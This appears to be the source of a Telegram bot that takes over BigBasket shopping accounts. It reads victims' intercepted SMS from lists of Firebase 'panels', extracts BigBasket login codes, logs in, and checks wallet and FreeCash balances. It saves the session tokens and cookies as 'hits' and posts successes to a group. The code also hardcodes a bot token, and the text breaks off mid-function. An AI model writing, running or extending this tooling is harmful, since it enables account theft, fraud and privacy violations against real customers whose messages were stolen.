#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
═══════════════════════════════════════════════════════════════
  🛒 BIGBASKET PREMIUM CHECKER BOT 
═══════════════════════════════════════════════════════════════
  ✅ Private chat only
  ✅ Manual (OTP input) + Auto Firebase
  ✅ OTP Check (last 5 SMS) — fast parallel fetch
  ✅ FreeCash FIXED (Bearer token header — no more 401)
  ✅ Colored buttons (premium look)
  ✅ Force join, hits, admin panel, broadcast

  SETUP: pip install aiogram curl_cffi aiohttp
  RUN:   python cashwala.py
═══════════════════════════════════════════════════════════════
"""

import asyncio
import re
import time
import uuid
import random
import json
import os
from datetime import datetime

import aiohttp
from curl_cffi.requests import AsyncSession
from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart, Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ═════════════════════════════════════════════
# ⚙️ CONFIG
# ═════════════════════════════════════════════
BOT_TOKEN  = "8981383764:AAEuqlK7bgL8q9zJW6AfsbtB8sp81uW08cQ"                    # ← Bot token
ADMIN_ID   = 8960648271                     # ← Your Telegram ID
GROUP_ID   = -1003529660366                     # ← Broadcast group ID

FORCE_CHANNELS = [
    {"name": "💎 Premium Channel", "url": "https://t.me/rewardradar0007", "id": "-1003864881307", "emoji": "💎"},
    {"name": "🎯 Backup Channel", "url": "https://t.me/TGautodidact", "id": "-1003066409773", "emoji": "🎯"}
]
FORCE_JOIN_ENABLED = True
BROADCAST_ENABLED  = True
MAX_WORKERS        = 30
OTP_TIMEOUT        = 30
SMS_FETCH_WORKERS  = 25

PANEL_FILE = "panels.txt"
HITS_FILE  = "hits.json"
STATS_FILE = "user_stats.json"

BB_PROFILES = [
    {"make": "Samsung", "model": "SM-A536E", "os": "13"},
    {"make": "Google",  "model": "Pixel 7",   "os": "14"},
    {"make": "OnePlus", "model": "IN2023",    "os": "13"},
    {"make": "Xiaomi",  "model": "2201116SG", "os": "13"},
    {"make": "Samsung", "model": "SM-S928B",  "os": "14"},
    {"make": "Vivo",    "model": "V2318",     "os": "14"},
]

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp  = Dispatcher(storage=MemoryStorage())

user_state      = {}
user_panels     = {}
active_bulk     = set()
verified_users  = set()
manual_sessions = {}


# ═════════════════════════════════════════════
# 💾 STORAGE
# ═════════════════════════════════════════════
HITS, STATS = {}, {}

def load_all():
    global HITS, STATS
    if os.path.exists(HITS_FILE):
        try:
            with open(HITS_FILE, "r", encoding="utf-8") as f:
                HITS = json.load(f)
        except: HITS = {}
    if os.path.exists(STATS_FILE):
        try:
            with open(STATS_FILE, "r", encoding="utf-8") as f:
                STATS = json.load(f)
        except: STATS = {}

def save_hits():
    try:
        with open(HITS_FILE, "w", encoding="utf-8") as f:
            json.dump(HITS, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"save_hits: {e}")

def save_stats():
    try:
        with open(STATS_FILE, "w", encoding="utf-8") as f:
            json.dump(STATS, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"save_stats: {e}")

def save_hit(phone, wallet, freecash, login_json, user_id, mode):
    HITS[phone] = {
        "phone": phone,
        "wallet": wallet,
        "freecash": freecash,
        "login_json": login_json,
        "user_id": str(user_id),
        "mode": mode,
        "timestamp": datetime.now().isoformat(),
    }
    save_hits()
    uid = str(user_id)
    STATS.setdefault(uid, {"hits": 0, "wallet": 0, "freecash": 0})
    STATS[uid]["hits"] += 1
    STATS[uid]["wallet"] += int(wallet or 0)
    STATS[uid]["freecash"] += int(freecash or 0)
    save_stats()


# ═════════════════════════════════════════════
# 🎨 COLORED BUTTON HELPERS
# ═════════════════════════════════════════════
def b(text, cb=None, url=None, style=None):
    """Build button with optional color (primary/success/danger)."""
    try:
        btn = InlineKeyboardButton(text=text, callback_data=cb, url=url)
        if style:
            try: btn.style = style
            except: pass
        return btn
    except Exception:
        return InlineKeyboardButton(text=text, callback_data=cb, url=url)

def kb(rows):
    return InlineKeyboardMarkup(inline_keyboard=rows)


# ═════════════════════════════════════════════
# 🎨 MENUS
# ═════════════════════════════════════════════
def main_menu_kb(chat_id):
    rows = [
        [b("🔍 Manual",       cb="manual",  style="primary"),
         b("🔥 Auto Firebase", cb="auto",    style="success")],
        [b("📩 OTP Check",    cb="otp_check", style="primary"),
         b("📊 My Stats",     cb="stats",   style="success")],
    ]
    if chat_id == ADMIN_ID:
        rows.append([b("👑 Admin Panel", cb="admin", style="danger")])
    return kb(rows)

def manual_menu_kb():
    return kb([
        [b("📱 Enter Number", cb="manual_num",  style="primary"),
         b("🔐 Login JSON",   cb="manual_json", style="success")],
        [b("🏠 Main Menu", cb="menu", style="primary")],
    ])

def after_check_kb(phone):
    return kb([
        [b("📥 Get Login JSON", cb=f"json_{phone}", style="success"),
         b("🔄 Check Another",  cb="manual",       style="primary")],
        [b("🏠 Main Menu", cb="menu", style="primary")],
    ])

def auto_kb(chat_id):
    panels = user_panels.get(chat_id, [])
    return kb([
        [b("➕ Add Panel",  cb="panel_add",   style="success"),
         b("📋 My Panels",  cb="panel_list",  style="primary")],
        [b("📥 Get JSON",   cb="get_json",    style="success"),
         b("🧪 Test Firebase", cb="health",   style="primary")],
        [b(f"▶️ Start Auto ({len(panels)})", cb="bulk_start", style="success")],
        [b("🗑 Remove All", cb="panel_clear", style="danger"),
         b("🏠 Main Menu",  cb="menu",        style="primary")],
    ])

def otp_check_kb():
    return kb([
        [b("🔄 Check Another", cb="otp_check", style="success"),
         b("🏠 Main Menu",     cb="menu",      style="primary")],
    ])

def back_kb(target="menu"):
    return kb([[b("🔙 Back", cb=target, style="primary")]])

def join_kb(not_joined):
    rows = [[b(f"🔗 Join {ch['name']}", url=ch["url"], style="primary")] for ch in not_joined]
    rows.append([b("✅ I've Joined — Verify", cb="verify_join", style="success")])
    return kb(rows)

def admin_kb():
    return kb([
        [b("📊 Stats",  cb="admin_stats",  style="primary"),
         b("🎁 Hits",   cb="admin_hits",   style="success")],
        [b("👥 Users",  cb="admin_users",  style="primary"),
         b("📤 Export", cb="admin_export", style="success")],
        [b("🏠 Main Menu", cb="menu", style="primary")],
    ])

def escape(s):
    if s is None: return "N/A"
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def mask_phone(p):
    if not p or len(p) < 4: return "N/A"
    return f"{p[:2]}{'x' * (len(p) - 4)}{p[-2:]}"


# ═════════════════════════════════════════════
# 🔒 PRIVATE CHAT ONLY
# ═════════════════════════════════════════════
def is_private(obj):
    try:
        if hasattr(obj, 'chat') and obj.chat: return obj.chat.type == "private"
        if hasattr(obj, 'message') and obj.message: return obj.message.chat.type == "private"
        return False
    except: return False

async def reject_group(obj):
    try:
        cid = obj.chat.id if hasattr(obj, 'chat') else obj.message.chat.id
        me = await bot.get_me()
        await bot.send_message(cid,
            f"🚫 <b>Private chat only!</b>\n\n👉 DM me: @{me.username}",
            parse_mode='HTML')
    except: pass


# ═════════════════════════════════════════════
# 🔒 FORCE JOIN
# ═════════════════════════════════════════════
async def check_joined(chat_id) -> tuple[bool, list]:
    if not FORCE_JOIN_ENABLED: return True, []
    if chat_id in verified_users: return True, []
    not_joined = []
    for ch in FORCE_CHANNELS:
        try:
            m = await bot.get_chat_member(ch["id"], chat_id)
            if m.status in ("left", "kicked"): not_joined.append(ch)
        except: continue
    if not not_joined:
        verified_users.add(chat_id)
        return True, []
    return False, not_joined

async def send_join_prompt(chat_id, not_joined):
    text = (
        "╔══════════════════════════╗\n"
        "║  🔒 <b>JOIN CHANNELS</b> 🔒 ║\n"
        "╚══════════════════════════╝\n\n"
        "🚫 <b>You must join all channels first!</b>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    for ch in not_joined:
        text += f"  • {escape(ch['name'])}\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━\n\n👇 <b>Join and Verify</b>"
    await bot.send_message(chat_id, text, reply_markup=join_kb(not_joined))


# ═════════════════════════════════════════════
# 🔢 HELPERS
# ═════════════════════════════════════════════
def parse_numeric(val):
    if val is None: return 0
    try:
        if isinstance(val, (int, float)):
            return int(val) if float(val).is_integer() else round(float(val), 2)
        s = str(val).replace("₹", "").replace(",", "").replace("Rs", "").replace("rs", "").strip()
        m = re.search(r'-?\d+\.?\d*', s)
        if m:
            f = float(m.group(0))
            return int(f) if f.is_integer() else round(f, 2)
    except: pass
    return 0


def extract_freecash(data):
    if not isinstance(data, dict) or "error" in data: return 0
    if data.get("message") == "Javelin campaign not found": return 0

    keys = [
        "total_freecash_amount", "free_cash_amount", "freecash_amount",
        "total_free_cash", "freecash_balance", "free_cash_balance",
        "total_amount", "reward_amount", "cash_amount",
        "available_amount", "amount", "balance", "total_balance",
        "total_freecash", "current_freecash", "current_free_cash",
        "wallet_amount", "credit_amount", "available_balance",
        "totalFreecashAmount", "freeCashAmount", "freecashAmount",
        "totalFreeCash", "freeCashBalance", "freecashBalance",
        "totalAmount", "rewardAmount", "cashAmount",
        "availableAmount", "totalBalance",
    ]

    for k in keys:
        if k in data:
            v = parse_numeric(data[k])
            if v > 0: return v

    def deep(node, depth=0):
        if depth > 5: return 0
        if isinstance(node, dict):
            for k in keys:
                if k in node:
                    v = parse_numeric(node[k])
                    if v > 0: return v
            for c in node.values():
                if isinstance(c, (dict, list)):
                    v = deep(c, depth + 1)
                    if v > 0: return v
        elif isinstance(node, list):
            for item in node:
                if isinstance(item, (dict, list)):
                    v = deep(item, depth + 1)
                    if v > 0: return v
        return 0

    for cont in ["data", "freecash_info", "free_cash_info", "campaign",
                 "campaigns", "result", "results", "response", "payload",
                 "details", "wallet", "reward", "rewards", "javelin"]:
        if cont in data:
            v = deep(data[cont])
            if v > 0: return v

    v = deep(data)
    if v > 0: return v
    return 0


# ═════════════════════════════════════════════
# 🛒 BB CLIENT
# ═════════════════════════════════════════════
class BBClient:
    def __init__(self, phone):
        self.mobile = str(phone).strip()
        self.session = AsyncSession(impersonate="chrome120")
        self.profile = random.choice(BB_PROFILES)
        self.device_id = ''.join(random.choices('0123456789abcdef', k=16))
        self.bb_token = None
        self.ref_id = None
        self.csrf_token = None
        self.headers = {
            "User-Agent": f"BB Android/v8.38.0/os {self.profile['os']}",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-IN,en;q=0.9",
            "x-channel": "BB-Android",
            "x-tcp-device-version": "android_8.38.0_25115710",
            "x-tcp-platform": "native",
            "x-entry-context": "bb-b2c",
            "x-entry-context-id": "100",
            "x-bucket-id": "36",
            "x-device-id": self.device_id,
            "x-device-model": f"{self.profile['make']} {self.profile['model']}",
            "x-is-debug": "false",
            "x-pharma": "true",
            "x-retry": "0",
            "x-integrated-fc-door-visible": "true",
            "x-tracker": str(uuid.uuid4()),
            "common-client-static-version": "105",
            "Origin": "https://www.bigbasket.com",
            "Referer": "https://www.bigbasket.com/",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "sec-ch-ua-platform": '"Android"',
            "sec-ch-ua-mobile": "?1",
        }

    async def close(self):
        try: await self.session.close()
        except: pass

    def load_login_json(self, data: dict):
        try:
            token = data.get("bb_token") or data.get("token")
            if token:
                self.bb_token = token
                self.session.cookies.set("BBAUTHTOKEN", token, domain=".bigbasket.com")
            for k, ck in [("customer_hash", "customer_hash"), ("m_id", "_bb_mid")]:
                if data.get(k):
                    self.session.cookies.set(ck, data[k], domain=".bigbasket.com")
            return True
        except: return False

    async def setup_device(self):
        try:
            reg = {
                "imei": "02:00:00:00:00:00",
                "device_id": self.device_id,
                "city_id": "1",
                "properties": json.dumps({
                    "platform": "java", "os_name": "android",
                    "os_version": self.profile["os"], "app_version": "8.38.0",
                    "device_make": self.profile["make"],
                    "device_model": self.profile["model"],
                    "screen_resolution": "1080X2400", "screen_dpi": 440
                })
            }
            h = self.headers.copy()
            h["Content-Type"] = "application/x-www-form-urlencoded"
            await self.session.post(
                "https://www.bigbasket.com/mapi/v4.2.0/register/device/",
                data=reg, headers=h, timeout=12
            )
            await self.session.get(
                "https://www.bigbasket.com/ui-svc/v2/header/?send_door_info=true&app_launch=true",
                headers=self.headers, timeout=10
            )
            try:
                await self.session.get("https://www.bigbasket.com/", headers=self.headers, timeout=10)
            except: pass
            self.csrf_token = self.session.cookies.get("csurftoken")
        except: pass

    async def send_otp(self):
        await self.setup_device()
        self.headers["Content-Type"] = "application/json"
        self.headers["x-tracker"] = str(uuid.uuid4())
        if self.csrf_token:
            self.headers["x-csurftoken"] = self.csrf_token
        try:
            r = await self.session.post(
                "https://www.bigbasket.com/member-tdl/v3/member/otp/",
                json={"identifier": self.mobile, "referrer": "unified_login"},
                headers=self.headers, timeout=15
            )
            if r.status_code == 400: return "BANNED"
            if r.status_code == 403: return "BLOCKED"
            d = r.json()
            if r.status_code == 200 and d.get("message") == "OTP sent successfully":
                self.ref_id = d.get("refId")
                return "SUCCESS"
            return "FAILED"
        except: return "ERROR"

    async def verify(self, otp):
        if not self.ref_id: return "FAILED", {}
        self.headers["x-tracker"] = str(uuid.uuid4())
        if self.csrf_token:
            self.headers["x-csurftoken"] = self.csrf_token
        try:
            r = await self.session.post(
                "https://www.bigbasket.com/member-tdl/v3/member/unified-login/",
                json={"mobile_no": self.mobile, "mobile_no_otp": str(otp).strip(), "refId": self.ref_id},
                headers=self.headers, timeout=15
            )
            d = r.json()
            if r.status_code == 200 and "bb_token" in d:
                self.bb_token = d["bb_token"]
                self.session.cookies.set("BBAUTHTOKEN", self.bb_token, domain=".bigbasket.com")
                for k, ck in [("customer_hash", "customer_hash"), ("m_id", "_bb_mid")]:
                    if d.get(k): self.session.cookies.set(ck, d[k], domain=".bigbasket.com")
                self.csrf_token = self.session.cookies.get("csurftoken") or self.csrf_token
                try:
                    await asyncio.sleep(0.3)
                    await self.session.get("https://www.bigbasket.com/", headers=self.headers, timeout=8)
                except: pass
                return "SUCCESS", d
            return "INVALID", d
        except: return "ERROR", {}

    async def get_login_json(self, auth_data=None):
        try: cookies = {k: v for k, v in self.session.cookies.items()}
        except: cookies = {}
        login = {
            "phone": self.mobile,
            "bb_token": self.bb_token or "",
            "customer_hash": cookies.get("customer_hash", ""),
            "m_id": cookies.get("_bb_mid", ""),
            "cookies": cookies,
        }
        if isinstance(auth_data, dict):
            for k in ("access_token", "refresh_token", "first_name", "last_name", "email"):
                if auth_data.get(k): login[k] = auth_data[k]
        return login

    async def wallet(self):
        if not self.bb_token: return 0
        try:
            h = self.headers.copy()
            h["x-entry-context"] = "bbnow"
            h["x-entry-context-id"] = "10"
            h["x-tracker"] = str(uuid.uuid4())
            h["Authorization"] = f"Bearer {self.bb_token}"
            r = await self.session.get(
                "https://www.bigbasket.com/wallet/v1/details",
                headers=h, timeout=12
            )
            if r.status_code == 200:
                return parse_numeric(r.json().get("total_balance", 0))
        except: pass
        return 0

    async def freecash(self):
        """FreeCash — tries Javelin + Rewards + Homepage endpoints."""
        if not self.bb_token:
            return 0

        # Refresh
        try:
            await self.session.get("https://www.bigbasket.com/", headers=self.headers, timeout=8)
            await asyncio.sleep(0.3)
        except: pass

        csrf = self.session.cookies.get("csurftoken") or self.csrf_token

        # ═══ Base headers ═══
        def make_headers(auth_mode="bearer"):
            h = self.headers.copy()
            h["x-tracker"] = str(uuid.uuid4())
            h["x-entry-context"] = "homepage"
            h["x-entry-context-id"] = "0"
            h["Referer"] = "https://www.bigbasket.com/"
            h["Origin"] = "https://www.bigbasket.com"
            if auth_mode == "bearer":
                h["Authorization"] = f"Bearer {self.bb_token}"
            if csrf:
                h["x-csurftoken"] = csrf
            return h

        # ═══ Javelin + Rewards endpoints to try ═══
        # POST endpoints with payloads
        post_attempts = [
            # Javelin (the new freecash system)
            ("https://www.bigbasket.com/ui-svc/v1/javelin-campaign/", {"context": "homepage"}),
            ("https://www.bigbasket.com/ui-svc/v2/javelin-campaign/", {"context": "homepage"}),
            ("https://www.bigbasket.com/ui-svc/v1/javelin/", {"context": "homepage"}),
            # Rewards
            ("https://www.bigbasket.com/ui-svc/v1/rewards/", {"context": "homepage"}),
            ("https://www.bigbasket.com/ui-svc/v2/rewards/", {"context": "homepage"}),
            # Homepage (has freecash widget data)
            ("https://www.bigbasket.com/ui-svc/v2/homepage/", {"page_type": "homepage"}),
            ("https://www.bigbasket.com/ui-svc/v1/homepage/", {"page_type": "homepage"}),
            # V3 free-cash
            ("https://www.bigbasket.com/ui-svc/v3/free-cash/", {"context": "homepage"}),
            # Self-service freecash
            ("https://www.bigbasket.com/wallet/v1/free-cash/", {}),
            ("https://www.bigbasket.com/wallet/v2/free-cash/", {}),
        ]

        for url, payload in post_attempts:
            for mode in ["bearer", "cookie_only"]:
                try:
                    h = make_headers(mode)
                    r = await self.session.post(url, json=payload, headers=h, timeout=10)
                    body = ""
                    try: body = r.text[:150].replace("\n", " ")
                    except: pass

                    path = url.split("bigbasket.com/")[-1]
                    print(f"[FC] {self.mobile} POST {path} ({mode}) -> {r.status_code}")

                    if r.status_code == 200:
                        data = r.json()
                        fc = extract_freecash(data)
                        if fc > 0:
                            print(f"[FC OK] {self.mobile} {path} -> Rs.{fc}")
                            return fc
                        else:
                            # Log body to see what came back
                            print(f"[FC] {self.mobile} {path} body: {json.dumps(data)[:300]}")
                except Exception as e:
                    pass  # Silent — we have many attempts

        # ═══ GET endpoints (no body) ═══
        get_attempts = [
            "https://www.bigbasket.com/ui-svc/v1/javelin-campaign/?context=homepage",
            "https://www.bigbasket.com/ui-svc/v1/rewards/?context=homepage",
            "https://www.bigbasket.com/ui-svc/v1/freecash/?context=homepage",
            "https://www.bigbasket.com/wallet/v1/freecash/",
            "https://www.bigbasket.com/ui-svc/v1/free-cash/details/",
        ]

        for url in get_attempts:
            try:
                h = make_headers("bearer")
                r = await self.session.get(url, headers=h, timeout=10)
                path = url.split("bigbasket.com/")[-1].split("?")[0]
                print(f"[FC] {self.mobile} GET {path} -> {r.status_code}")
                if r.status_code == 200:
                    fc = extract_freecash(r.json())
                    if fc > 0:
                        print(f"[FC OK] {self.mobile} GET {path} -> Rs.{fc}")
                        return fc
            except: pass

        # ═══ Last resort: check signupVoucher from verify response ═══
        # Sometimes freecash is stored in the login response and never re-fetched
        # Return 0 as honest fallback

        print(f"[FC FAIL] {self.mobile}")
        return 0


# ═════════════════════════════════════════════
# 🔥 FIREBASE HELPERS (FAST)
# ═════════════════════════════════════════════
def parse_fb_link(link):
    if not link.startswith("http"): link = "https://" + link
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        return link if link.endswith("/") else link + "/"
    return None

def extract_phone_from_msgs(msgs):
    text = str(msgs)
    m = re.search(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', text)
    return m.group(1) if m else None

def extract_bb_otp(text):
    text = str(text)
    m = re.search(r'Bigbasket\s+login\s+code:\s*(\d{6})', text, re.IGNORECASE)
    if m: return m.group(1)
    if any(k in text.lower() for k in ["bigbasket", "bbnow", "bigbkt"]):
        m = re.search(r'\b(\d{6})\b', text)
        if m: return m.group(1)
    return None

async def fb_get(url, path="", timeout=6):
    try:
        async with aiohttp.ClientSession() as s:
            full = url.rstrip("/") + "/" + path if path else url
            async with s.get(full, timeout=timeout) as r:
                if r.status == 200:
                    return await r.json()
    except: pass
    return None

async def fb_shallow(url, path):
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url.rstrip("/") + "/" + path, timeout=6) as r:
                if r.status == 200:
                    return await r.json()
    except: pass
    return None

async def fb_fetch_clients_batch(session, url):
    try:
        async with session.get(url.rstrip("/") + "/clients.json", timeout=8) as r:
            if r.status == 200:
                return await r.json()
    except: pass
    return None

async def fb_fetch_messages(session, url, cid, limit=5):
    try:
        async with session.get(
            url.rstrip("/") + f"/messages/{cid}.json?orderBy=\"$key\"&limitToLast={limit}",
            timeout=6
        ) as r:
            if r.status == 200:
                return await r.json()
    except: pass
    return None

def load_admin_panels():
    if not os.path.exists(PANEL_FILE): return []
    urls = []
    with open(PANEL_FILE, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"): continue
            u = parse_fb_link(line.split("|")[0].strip())
            if u: urls.append(u)
    return urls


# ═════════════════════════════════════════════
# ⚡ FAST SEARCH (OTP Check)
# ═════════════════════════════════════════════
async def fast_search_number(phone, panels):
    async with aiohttp.ClientSession() as session:
        tasks = [fb_fetch_clients_batch(session, url) for url in panels]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        candidates = []
        for url, data in zip(panels, results):
            if not isinstance(data, dict): continue
            for cid, cd in data.items():
                if not isinstance(cd, dict): continue
                # Instant match on direct field
                for key in ["mobNo", "phoneNumber", "phone", "mobile", "msisdn", "subId"]:
                    v = str(cd.get(key, ""))
                    if v:
                        d = re.sub(r"\D", "", v)[-10:]
                        if d == phone:
                            return url, cid
                candidates.append((url, cid, cd.get("status", False)))

        sem = asyncio.Semaphore(SMS_FETCH_WORKERS)

        async def check(url, cid, is_online):
            async with sem:
                if not is_online: return None
                msgs = await fb_fetch_messages(session, url, cid, limit=10)
                if msgs and extract_phone_from_msgs(msgs) == phone:
                    return (url, cid)
                return None

        tasks = [check(u, c, s) for u, c, s in candidates]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if r: return r

    return None, None


# ═════════════════════════════════════════════
# 📢 BROADCAST
# ═════════════════════════════════════════════
async def broadcast_success(phone, wallet, freecash, mode="Manual"):
    if not BROADCAST_ENABLED or not GROUP_ID: return
    text = (
        f"🎉 <b>NEW CHECK SUCCESSFUL</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 <b>Mode:</b> {mode}\n"
        f"📱 <b>Number:</b> <code>{mask_phone(phone)}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💰 <b>Wallet:</b> <code>₹{wallet}</code>\n"
        f"🎁 <b>FreeCash:</b> <code>₹{freecash}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🕐 {datetime.now().strftime('%H:%M:%S')}"
    )
    try: await bot.send_message(GROUP_ID, text, parse_mode='HTML')
    except Exception as e: print(f"Broadcast: {e}")


# ═════════════════════════════════════════════
# 📋 FORMATTERS
# ═════════════════════════════════════════════
def fmt_success(phone, wallet, freecash):
    return (
        "╔══════════════════════════╗\n"
        "║  ✅ <b>CHECK SUCCESSFUL</b> ✅║\n"
        "╚══════════════════════════╝\n\n"
        f"📱 <b>Number:</b> <code>{escape(phone)}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💰 <b>Wallet:</b> <code>₹{wallet}</code>\n"
        f"🎁 <b>FreeCash:</b> <code>₹{freecash}</code>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

def fmt_fail(reason):
    return (
        "╔══════════════════════════╗\n"
        "║  ❌ <b>CHECK FAILED</b> ❌  ║\n"
        "╚══════════════════════════╝\n\n"
        f"<b>Reason:</b> {escape(reason)}\n\n"
        "💡 <i>Try again later</i>"
    )


# ═════════════════════════════════════════════
# 🔍 MANUAL MODE
# ═════════════════════════════════════════════
async def manual_send_otp(chat_id, phone):
    old = manual_sessions.pop(chat_id, None)
    if old and old.get("client"): await old["client"].close()

    msg = await bot.send_message(chat_id, "📤 <b>Sending OTP...</b>")
    client = BBClient(phone)
    st = await client.send_otp()

    if st == "BANNED":
        await msg.edit_text(fmt_fail("Not registered on BigBasket"), reply_markup=manual_menu_kb())
        await client.close(); return
    if st == "BLOCKED":
        await msg.edit_text(fmt_fail("Server blocked — try later"), reply_markup=manual_menu_kb())
        await client.close(); return
    if st != "SUCCESS":
        await msg.edit_text(fmt_fail("Failed to send OTP"), reply_markup=manual_menu_kb())
        await client.close(); return

    manual_sessions[chat_id] = {"client": client, "phone": phone}
    user_state[chat_id] = "WAITING_MANUAL_OTP"

    await msg.edit_text(
        "╔══════════════════════════╗\n"
        "║  📩 <b>OTP SENT!</b>        ║\n"
        "╚══════════════════════════╝\n\n"
        f"📱 To: <code>+91{escape(phone)}</code>\n\n"
        "🔐 <b>Enter 6-digit OTP:</b>",
        reply_markup=back_kb("manual")
    )

async def manual_verify_otp(chat_id, otp):
    session = manual_sessions.get(chat_id)
    if not session:
        await bot.send_message(chat_id, "❌ <b>Session expired!</b>", reply_markup=manual_menu_kb())
        user_state.pop(chat_id, None); return

    client, phone = session["client"], session["phone"]
    msg = await bot.send_message(chat_id, "🔄 <b>Verifying OTP...</b>")
    status, auth_data = await client.verify(otp)

    if status != "SUCCESS":
        await msg.edit_text("❌ <b>Invalid OTP</b>\n\nTry again:", reply_markup=back_kb("manual"))
        return

    await msg.edit_text("✅ <b>Login OK!</b>\n💰 Fetching balances...")
    wallet = await client.wallet()
    await asyncio.sleep(1)
    fc = await client.freecash()
    login_json = await client.get_login_json(auth_data)

    save_hit(phone, wallet, fc, login_json, chat_id, "Manual")

    manual_sessions.pop(chat_id, None)
    user_state.pop(chat_id, None)
    await client.close()

    await msg.edit_text(
        fmt_success(phone, wallet, fc) + "\n\n📥 <b>Login JSON saved!</b>",
        reply_markup=after_check_kb(phone)
    )
    await broadcast_success(phone, wallet, fc, mode="Manual")

async def do_manual_json(chat_id, json_text):
    try: data = json.loads(json_text)
    except:
        await bot.send_message(chat_id, "❌ <b>Invalid JSON!</b>", reply_markup=manual_menu_kb()); return

    phone = data.get("phone") or data.get("mobile") or ""
    if not phone:
        m = re.search(r'([6-9]\d{9})', str(data))
        if m: phone = m.group(1)
    if not phone:
        await bot.send_message(chat_id, "❌ <b>No phone in JSON</b>", reply_markup=manual_menu_kb()); return

    msg = await bot.send_message(chat_id, "🔐 <b>Loading...</b>")
    client = BBClient(phone)
    if not client.load_login_json(data) or not client.bb_token:
        await msg.edit_text(fmt_fail("Invalid token"), reply_markup=manual_menu_kb())
        await client.close(); return

    await msg.edit_text("✅ <b>Session loaded!</b>\n💰 Fetching...")
    wallet = await client.wallet()
    await asyncio.sleep(0.8)
    fc = await client.freecash()

    save_hit(phone, wallet, fc, data, chat_id, "JSON")
    await client.close()

    await msg.edit_text(
        "╔══════════════════════════╗\n"
        "║  🔐 <b>JSON CHECK DONE</b>  ║\n"
        "╚══════════════════════════╝\n\n"
        f"📱 <code>{escape(phone)}</code>\n"
        f"💰 ₹{wallet} | 🎁 ₹{fc}",
        reply_markup=after_check_kb(phone)
    )
    await broadcast_success(phone, wallet, fc, mode="JSON")


# ═════════════════════════════════════════════
# 📥 GET LOGIN JSON
# ═════════════════════════════════════════════
async def send_login_json(chat_id, phone):
    hit = HITS.get(phone)
    if not hit or not hit.get("login_json"):
        await bot.send_message(chat_id, "❌ <b>No JSON saved</b>", reply_markup=back_kb("auto")); return
    if str(chat_id) != str(hit.get("user_id")) and chat_id != ADMIN_ID:
        await bot.send_message(chat_id, "❌ <b>Not your hit</b>", reply_markup=back_kb("auto")); return

    js = json.dumps(hit["login_json"], indent=2, ensure_ascii=False)
    if len(js) > 3500: js = js[:3500] + "\n...(truncated)"

    await bot.send_message(chat_id,
        "╔══════════════════════════╗\n"
        "║  🔐 <b>LOGIN JSON</b>       ║\n"
        "╚══════════════════════════╝\n\n"
        f"📱 <code>{escape(phone)}</code>\n"
        f"💰 ₹{hit.get('wallet',0)} | 🎁 ₹{hit.get('freecash',0)}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<pre>{escape(js)}</pre>",
        reply_markup=after_check_kb(phone))


# ═════════════════════════════════════════════
# 📩 OTP CHECK (fast)
# ═════════════════════════════════════════════
async def do_otp_check(chat_id, phone):
    panels = user_panels.get(chat_id, []) + load_admin_panels()
    if not panels:
        await bot.send_message(chat_id, "❌ <b>No panels</b>", reply_markup=otp_check_kb()); return

    msg = await bot.send_message(chat_id, "🔍 <b>Fast searching...</b>")
    start = time.time()
    fb_url, cid = await fast_search_number(phone, panels)
    elapsed = round(time.time() - start, 2)

    if not fb_url:
        await msg.edit_text(
            "╔══════════════════════════╗\n"
            "║  ❌ <b>NOT FOUND</b>       ║\n"
            "╚══════════════════════════╝\n\n"
            f"📱 <code>{escape(phone)}</code>\n\n"
            f"⏱️ Searched in {elapsed}s\n"
            "Not in any panel.",
            reply_markup=otp_check_kb()); return

    await msg.edit_text(f"📩 <b>Found in {elapsed}s!</b>\nFetching SMS...")

    msgs_data = await fb_get(fb_url, f"messages/{cid}.json?orderBy=\"$key\"&limitToLast=5")
    if not isinstance(msgs_data, dict) or not msgs_data:
        await msg.edit_text("📭 <b>No SMS found</b>", reply_markup=otp_check_kb()); return

    try:
        sorted_msgs = sorted(msgs_data.items(),
                             key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0,
                             reverse=True)
    except: sorted_msgs = list(msgs_data.items())[::-1]

    text = (
        "╔══════════════════════════╗\n"
        "║  📩 <b>LAST 5 SMS</b>       ║\n"
        "╚══════════════════════════╝\n\n"
        f"📱 <code>{escape(phone)}</code>\n"
        f"⏱️ Fetched in {elapsed}s\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    for i, (mk, mv) in enumerate(sorted_msgs[:5], 1):
        if not isinstance(mv, dict): continue
        sender = str(mv.get("sender") or mv.get("from") or mv.get("address") or "Unknown")
        body = str(mv.get("body") or mv.get("message") or mv.get("text") or "")
        if len(body) > 250: body = body[:250] + "..."
        ts = ""
        try:
            if str(mk).isdigit():
                ts = datetime.fromtimestamp(int(mk) / 1000).strftime("%d %b %H:%M")
        except: pass
        text += f"<b>#{i}</b> 📨 <code>{escape(sender)}</code>\n"
        if ts: text += f"<i>{ts}</i>\n"
